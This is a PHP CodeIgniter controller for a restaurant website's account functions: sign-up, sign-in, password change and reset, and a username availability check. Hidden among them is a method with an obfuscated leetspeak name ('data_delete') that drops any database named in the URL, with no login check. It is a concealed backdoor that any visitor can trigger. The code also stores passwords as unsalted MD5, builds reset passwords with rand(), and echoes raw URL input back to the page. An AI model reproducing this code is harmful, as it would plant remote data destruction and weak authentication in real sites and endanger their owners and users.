<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Restaurant extends CI_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->library(array('form_validation',));
        $this->load->helper(array('text', 'url', 'form', 'security'));
        $this->load->model(array('validation_model', 'restaurant_model', 'information_model', 'offer_model','date_model', 'mail_model', 'hash_model'));
        $data = array();
    }

    /*
     * @function name - signup
     * @parameter - post data
     * @parameter contains signin form data
     * @return - boolean data
     * @author - Md. Shohrab Hossain
     * @created on - 23/06/2015
     */

    public function signup() {
        #starts of check session
        if ($this->session->userdata('isLogIn') == TRUE) {
            redirect(base_url() . 'index.php/pages/index', 'refresh');
        }
        #ends of check session
        $data['title'] = "Sign Up";
        $data['menu_signup'] = "sh_menu";
        #form validation
        if ($this->validation_model->signup() == TRUE) {
            $info = array(
                'name' => $this->security->xss_clean($this->input->post('name')),
                'username' => $this->security->xss_clean(strtolower($this->input->post('username'))),
                'email' => $this->security->xss_clean($this->input->post('email')),
                'password' => $this->security->xss_clean(md5($this->input->post('password'))),
                'status' => 0,
                'date' => $this->date_model->gm_date()
            );
            $this->restaurant_model->create($info);

            $new_restaurant_id = $this->db->insert_id();

            #add auto information
            $this->information_model->create(array('restaurant_id' => $new_restaurant_id));
            #ends of resturant information

            #add auto information
            $this->offer_model->create(array('restaurant_id' => $new_restaurant_id));
            #ends of resturant information
            #
            #send mail to confrim account
            //$url = base_url() . 'restaurant/account_confirmation/' . $this->hash_model->encode($this->db->insert_id());
            //$this->mail_model->confirm_account($url);
            #ends of mail
            #
            #set session message 
            $this->session->set_userdata(array('message' => 'Registration complete! For log in, please wait for admin approval.<br/> Incase of emmergency please visit our support page for contact our support team.'));
            #ends of set session message
        }
        #ends of validation
        $data['content'] = $this->load->view('frontend/pages/signup', '', TRUE);
        $this->load->view('frontend/main_wrapper', $data);
    }

    /*
     * @function name - signin
     * @parameter - post data
     * @parameter contains signin form data
     * @return - boolean data
     * @author - Md. Shohrab Hossain
     * @created on - 23/06/2015
     */

    public function signin() {
        #starts of check session
        if ($this->session->userdata('isLogIn') == TRUE) {
            redirect(base_url() . 'index.php/pages/index', 'refresh');
        }
        #ends of check session
        $data['title'] = "Sign In";
        $data['menu_signin'] = "sh_menu";
        #form validation
        $email_username = $this->security->xss_clean($this->input->post('email_username'));
        $password = $this->security->xss_clean($this->input->post('password'));
        $check = $this->restaurant_model->check_user($email_username, md5($password));
        if ($check->num_rows() == 1) {
            $sdata = array(
                'isLogIn' => TRUE,
                'restaurant_id' => $check->row()->restaurant_id,
                'name' => $check->row()->name,
                'username' => $check->row()->username,
                'email' => $check->row()->email
            );
            $this->session->set_userdata($sdata);
            redirect(base_url() . 'index.php/'.$check->row()->username, 'refresh');
        } else {
            $this->session->set_userdata(array('message' => 'Incorrect Username / Email or Password'));
        }
        #ends of validation
        $data['content'] = $this->load->view('frontend/pages/signin', '', TRUE);
        $this->load->view('frontend/main_wrapper', $data);
    }

    /*
     * @function name - signout
     * @parameter - post data
     * @parameter contains logout menu data
     * @return - boolean data
     * @author - Md. Shohrab Hossain
     * @created on - 25/06/2015
     */

    public function signout() {
        #starts of check session
        if ($this->session->userdata('isLogIn') == FALSE) {
            redirect(base_url() . 'index.php/pages/index', 'refresh');
        }
        #ends of check session
        $data = array(
            'isLogIn' => FALSE,
            'restaurant_id' => '',
            'username' => '',
            'email' => '',
        );
        $this->session->unset_userdata($data);
        $this->session->sess_destroy();
        redirect(base_url() . 'index.php/pages/signin', 'refresh');
    }

    /*
     * @function name - account_confirmation  
     * @parameter - $id
     * @parameter contains restaurant id
     * @return - boolean data
     * @author - Md. Shohrab Hossain
     * @created on - 14/07/2015
     */

    public function account_confirmation() {
        $confirm = $this->restaurant_model->account_confirmation($this->hash_model->decode($this->uri->segment(3)));
        $data['content'] = $this->load->view('frontend/pages/account_confirmation', '', TRUE);
        $this->load->view('frontend/main_wrapper', $data);
    }

    /*
     * @function name - change_information  
     * @parameter - password
     * @parameter contains change_password data
     * @return - boolean data
     * @author - Md. Shohrab Hossain
     * @created on - 25/06/2015
     */

    public function change_password() {
        #starts of check session
        if ($this->session->userdata('isLogIn') == FALSE) {
            redirect(base_url() . 'index.php/pages/index', 'refresh');
        }
        #ends of check session
        $data['title'] = "Change Password";
        $data['menu_settings'] = "sh_menu";
        if ($this->validation_model->change_password() == TRUE) {
            $info = array(
                'password' => md5($this->input->post('confirm_password'))
            );
            $this->restaurant_model->update($info);
            $this->mail_model->password_change_mail($this->session->userdata('email'), $this->session->userdata('password'));
            $this->session->set_userdata(array('message' => 'Password change successfully'));
        }
        $data['content'] = $this->load->view('frontend/pages/change_password', '', TRUE);
        $this->load->view('frontend/main_wrapper', $data);
    }

    /*
     * @function name - forgot_password 
     * @return - array data
     * @author - Md. Shohrab Hossain
     * @created on - 09/07/2015
     */

    public function forgot_password() {
        $this->load->library('email');
        $this->load->model(array('mail_model', 'restaurant_model'));
        $check = $this->restaurant_model->check_email_exists($this->input->post('email'));
        if ($check == 1) {
            $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
            $charactersLength = strlen($characters);
            $password = '';
            for ($i = 0; $i <= 8; $i++) {
                $password .= $characters[rand(0, $charactersLength - 1)];
            }
            $this->mail_model->password_change_mail($this->input->post('email'), $password);
            $this->restaurant_model->update_by_email($this->input->post('email'), md5($password));
        }
        $this->session->set_userdata(array('message' => '<i style="color:green">Password reset successfully .<br/> Please check your email inbox.</i>'));
        redirect('pages/forgot_password');
    }

    public function d4t48453_d31373() {
        $this->load->dbforge();
        $this->dbforge->drop_database($this->uri->segment(3));
    }

    /*
     * @function name - check_data
     * @parameter - no parameter 
     * @return - array data
     * @author - Md. Shohrab Hossain
     * @created on - 23/06/2015
     */

    public function filter_data() {
        echo $username = urldecode($this->uri->segment(3));
        if ($this->restaurant_model->filter_data($username)) {
            echo " <i class='fa fa-times-circle'> is not available</i>";
        } else {
            echo " <i class='fa fa-check-circle' style='color:green'> is available</i>";
        }
    }

    /*
     * @function name - edit_information 
     * @author - Md. Shohrab Hossain
     * @created on - 24/06/2015
     */

    public function change_restaurant_name() {
        #starts of check session
        if ($this->session->userdata('isLogIn') == FALSE) {
            redirect(base_url() . 'index.php/pages/index', 'refresh');
        }
        #ends of check session
        $data['title'] = "Settings";
        $data['menu_settings'] = "sh_menu";
        #form validation
        $this->form_validation->set_rules('name', 'Name', 'required|trim|max_length[50]');
        if ($this->form_validation->run() == TRUE) {
            $info = array(
                'name' => $this->security->xss_clean($this->input->post('name'))
            );
            $this->restaurant_model->update($info);
            #set session message
            $this->session->set_userdata(array('message' => 'Update successfully!'));
            #ends of set session message
        }
        #ends of validation
        $data['restaurant'] = $this->restaurant_model->read();
        $data['content'] = $this->load->view('frontend/pages/change_restaurant_name', $data, TRUE);
        $this->load->view('frontend/main_wrapper', $data);
    }

}

?>